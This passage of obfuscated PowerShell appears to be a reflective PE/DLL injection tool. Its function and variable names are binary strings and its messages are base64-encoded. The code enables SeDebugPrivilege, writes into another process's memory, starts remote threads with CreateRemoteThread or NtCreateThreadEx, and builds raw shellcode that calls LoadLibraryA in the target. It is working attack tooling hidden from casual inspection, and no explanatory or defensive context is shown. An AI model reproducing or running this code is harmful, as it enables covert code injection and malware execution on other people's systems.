			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${00101110111101011}, 0)
	}
	Function _01100001001101001
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${_01011000010111101},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_10100011100111111}
		)
		[Byte[]]${01010101001100110} = [BitConverter]::GetBytes(${_01011000010111101})
		[Byte[]]${00100101000101101} = [BitConverter]::GetBytes(${_10100011100111111})
		[Byte[]]${00101110111101011} = [BitConverter]::GetBytes([UInt64]0)
		if (${01010101001100110}.Count -eq ${00100101000101101}.Count)
		{
			${10101011011111000} = 0
			for (${00011111101110101} = 0; ${00011111101110101} -lt ${01010101001100110}.Count; ${00011111101110101}++)
			{
				[UInt16]${10111100110000100} = ${01010101001100110}[${00011111101110101}] + ${00100101000101101}[${00011111101110101}] + ${10101011011111000}
				${00101110111101011}[${00011111101110101}] = ${10111100110000100} -band 0x00FF
				if ((${10111100110000100} -band 0xFF00) -eq 0x100)
				{
					${10101011011111000} = 1
				}
				else
				{
					${10101011011111000} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${00101110111101011}, 0)
	}
	Function _01011101001111101
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${_01011000010111101},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_10100011100111111}
		)
		[Byte[]]${01010101001100110} = [BitConverter]::GetBytes(${_01011000010111101})
		[Byte[]]${00100101000101101} = [BitConverter]::GetBytes(${_10100011100111111})
		if (${01010101001100110}.Count -eq ${00100101000101101}.Count)
		{
			for (${00011111101110101} = ${01010101001100110}.Count-1; ${00011111101110101} -ge 0; ${00011111101110101}--)
			{
				if (${01010101001100110}[${00011111101110101}] -gt ${00100101000101101}[${00011111101110101}])
				{
					return $true
				}
				elseif (${01010101001100110}[${00011111101110101}] -lt ${00100101000101101}[${00011111101110101}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${10001100111101001} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${10001100111101001}, 0))
	}
    Function _01101110011100000
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )
        ${01000111011101110} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        ${10111000111010111} = "0x{0:X$(${01000111011101110})}" -f [Int64]$Value 
        return ${10111000111010111}
    }
	Function _00101100110101100
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${_10101101101010011},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${_10100000001011100},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${_01001110000011110}
		)
	    [IntPtr]${00100111111101111} = [IntPtr](_01100001001101001 (${_10100000001011100}) (${_01001110000011110}))
		${10111001000110000} = ${_00101101001101101}.EndAddress
		if ((_01011101001111101 (${_00101101001101101}.PEHandle) (${_10100000001011100})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAxADAAMQAwADEAMQAwADEAMQAwADEAMAAxADAAMAAxADEAfQA=')))
		}
		if ((_01011101001111101 (${00100111111101111}) (${10111001000110000})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAxADAAMQAwADEAMQAwADEAMQAwADEAMAAxADAAMAAxADEAfQA=')))
		}
	}
	Function _00000100110100000
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${_01111011100010111},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${_10100011101010110}
		)
		for (${10110011010001100} = 0; ${10110011010001100} -lt ${_01111011100010111}.Length; ${10110011010001100}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${_10100011101010110}, ${10110011010001100}, ${_01111011100010111}[${10110011010001100}])
		}
	}
	Function _10000101101101101
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${_00110001101111110} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${_00101110110100100} = [Void]
	    )
	    ${01011011111010100} = [AppDomain]::CurrentDomain
	    ${10000001010111101} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${01110111110000010} = ${01011011111010100}.DefineDynamicAssembly(${10000001010111101}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${10001000111011001} = ${01110111110000010}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${00110010010110100} = ${01100110111100111}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${_00110001101111110})
	    ${00110010010110100}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${00101110101000010} = ${01100110111100111}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${_00101110110100100}, ${_00110001101111110})
	    ${00101110101000010}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${01100110111100111}.CreateType()
	}
	Function _01010110001101110
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_10110010100101010},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${_10111111100011101}
	    )
	    ${10000101110100011} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${01100001111010010} = ${10000101110100011}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${00010101110110111} = ${01100001111010010}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${01101001111001111} = ${01100001111010010}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [reflection.bindingflags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    ${01101111000110110} = ${00010101110110111}.Invoke($null, @(${_10110010100101010}))
	    ${00110001010100000} = New-Object IntPtr
	    ${10000100000101101} = New-Object System.Runtime.InteropServices.HandleRef(${00110001010100000}, ${01101111000110110})
	    echo ${01101001111001111}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${10000100000101101}, ${_10111111100011101}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${11000001001111110} = $Win32Functions.GetCurrentThread.Invoke()
		if (${11000001001111110} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${01011111011010101} = [IntPtr]::Zero
		[Bool]${10010100000000000} = $Win32Functions.OpenThreadToken.Invoke(${11000001001111110}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${01011111011010101})
		if (${10010100000000000} -eq $false)
		{
			${00111001001111010} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${00111001001111010} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${10010100000000000} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${10010100000000000} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${10010100000000000} = $Win32Functions.OpenThreadToken.Invoke(${11000001001111110}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${01011111011010101})
				if (${10010100000000000} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMAAxADEAMQAwADAAMQAwADAAMQAxADEAMQAwADEAMAB9AA==')))
			}
		}
		[IntPtr]${00000111000010011} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${10010100000000000} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${00000111000010011})
		if (${10010100000000000} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${10010101001100010} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${01110101010001001} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10010101001100010})
		${00000111111011001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01110101010001001}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${00000111111011001}.PrivilegeCount = 1
		${00000111111011001}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00000111000010011}, [Type]$Win32Types.LUID)
		${00000111111011001}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00000111111011001}, ${01110101010001001}, $true)
		${10010100000000000} = $Win32Functions.AdjustTokenPrivileges.Invoke(${01011111011010101}, $false, ${01110101010001001}, ${10010101001100010}, [IntPtr]::Zero, [IntPtr]::Zero)
		${00111001001111010} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${10010100000000000} -eq $false) -or (${00111001001111010} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01110101010001001})
	}
	Function _10101101011101000
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${_01100001010100111},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${_10100000001011100},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${_10111110100100110} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${01011001010011101} = [IntPtr]::Zero
		${00101101010110110} = [Environment]::OSVersion.Version
		if ((${00101101010110110} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${00101101010110110} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			${10011101110010001}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${01011001010011101}, 0x1FFFFF, [IntPtr]::Zero, ${_01100001010100111}, ${_10100000001011100}, ${_10111110100100110}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${10110111000101110} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${01011001010011101} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewAxADAAMAAxADEAMQAwADEAMQAxADAAMAAxADAAMAAwADEAfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewAxADAAMQAxADAAMQAxADEAMAAwADAAMQAwADEAMQAxADAAfQA=')))
			}
		}
		else
		{
			${01011001010011101} = $Win32Functions.CreateRemoteThread.Invoke(${_01100001010100111}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${_10100000001011100}, ${_10111110100100110}, 0, [IntPtr]::Zero)
		}
		if (${01011001010011101} -eq [IntPtr]::Zero)
		{
			Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
		}
		return ${01011001010011101}
	}
	Function _01000010010110100
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_10100111001011110},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${11000010001111101} = New-Object System.Object
		${00111000110111010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_10100111001011110}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${01100110100101000} = [IntPtr](_01100001001101001 ([Int64]${_10100111001011110}) ([Int64][UInt64]${00111000110111010}.e_lfanew))
		${11000010001111101} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${01100110100101000}
		${10110101010010001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01100110100101000}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${10110101010010001}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${10110101010010001}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${11000010001111101} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${10110101010010001}
			${11000010001111101} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${00101101100010101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01100110100101000}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${11000010001111101} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${00101101100010101}
			${11000010001111101} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${11000010001111101}
	}
	Function _00111101101010000
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${_00101101001101101} = New-Object System.Object
		[IntPtr]${01100111010001011} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, ${01100111010001011}, $PEBytes.Length) | Out-Null
		${11000010001111101} = _01000010010110100 -_10100111001011110 ${01100111010001011} -Win32Types $Win32Types
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${11000010001111101}.PE64Bit)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${11000010001111101}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${11000010001111101}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${11000010001111101}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${11000010001111101}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01100111010001011})
		return ${_00101101001101101}
	}
	Function _01001001110001010
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${_10100111001011110},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${_10100111001011110} -eq $null -or ${_10100111001011110} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${_00101101001101101} = New-Object System.Object
		${11000010001111101} = _01000010010110100 -_10100111001011110 ${_10100111001011110} -Win32Types $Win32Types
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${_10100111001011110}
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${11000010001111101}.IMAGE_NT_HEADERS)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${11000010001111101}.NtHeadersPtr)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${11000010001111101}.PE64Bit)
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${11000010001111101}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${_00101101001101101}.PE64Bit -eq $true)
		{
			[IntPtr]${00001111011100110} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${_00101101001101101} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${00001111011100110}
		}
		else
		{
			[IntPtr]${00001111011100110} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${_00101101001101101} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${00001111011100110}
		}
		if ((${11000010001111101}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${_00101101001101101} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${11000010001111101}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${_00101101001101101} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${_00101101001101101}
	}
	Function _11000001000100101
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_10100101101101111},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_10110011101001100}
		)
		${10000101110111000} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${01011101010000101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_10110011101001100})
		${10101110000100111} = [UIntPtr][UInt64]([UInt64]${01011101010000101}.Length + 1)
		${10110001100000101} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, ${10101110000100111}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${10110001100000101} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${01111101001000000} = [UIntPtr]::Zero
		${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${10110001100000101}, ${_10110011101001100}, ${10101110000100111}, [Ref]${01111101001000000})
		if (${01110110101110011} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${10101110000100111} -ne ${01111101001000000})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${10100100001100110} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${01100101111011010} = $Win32Functions.GetProcAddress.Invoke(${10100100001100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${00000111101010110} = [IntPtr]::Zero
		if (${_00101101001101101}.PE64Bit -eq $true)
		{
			${10111110111100000} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, ${10101110000100111}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${10111110111100000} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${10100010101101000} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${00101100011001101} = @(0x48, 0xba)
			${00110011110011000} = @(0xff, 0xd2, 0x48, 0xba)
			${01110110010100000} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${01010110000000010} = ${10100010101101000}.Length + ${00101100011001101}.Length + ${00110011110011000}.Length + ${01110110010100000}.Length + (${10000101110111000} * 3)
			${10110100101010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010110000000010})
			${01110010010110000} = ${10110100101010101}
			_00000100110100000 -_01111011100010111 ${10100010101101000} -_10100011101010110 ${10110100101010101}
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${10100010101101000}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10110001100000101}, ${10110100101010101}, $false)
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
			_00000100110100000 -_01111011100010111 ${00101100011001101} -_10100011101010110 ${10110100101010101}
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${00101100011001101}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${01100101111011010}, ${10110100101010101}, $false)
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
			_00000100110100000 -_01111011100010111 ${00110011110011000} -_10100011101010110 ${10110100101010101}
			${10110100101010101} = _01100001001101001 ${10110100101010101} (${00110011110011000}.Length)
